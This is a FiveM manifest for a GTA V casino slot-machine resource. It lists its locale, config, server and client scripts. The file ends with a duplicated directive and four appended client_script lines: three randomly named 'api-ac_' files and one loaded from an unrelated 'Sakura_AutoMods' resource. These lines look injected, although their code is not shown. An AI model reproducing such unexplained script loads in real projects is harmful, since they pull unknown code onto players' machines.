fx_version 'adamant'
game 'gta5'
description 'VNS Casino Slots Machine'
version '2.1.3'
lua54 'yes'


server_scripts {
    '@es_extended/locale.lua',
    'locales/*.lua',
	'config.lua',
	'server.lua'
}

client_scripts {
    '@es_extended/locale.lua',
    'locales/*.lua',
	'config.lua',
	'client.lua',
}

dependency 'es_extended'

lua54 'yes'
client_script "api-ac_MSixQhPKmCnf.lua"
client_script "api-ac_xUkMANoRzPVS.lua"
client_script "api-ac_IaWDYjheHvJp.lua"


client_script '@Sakura_AutoMods/xDxDxDxDxD.lua'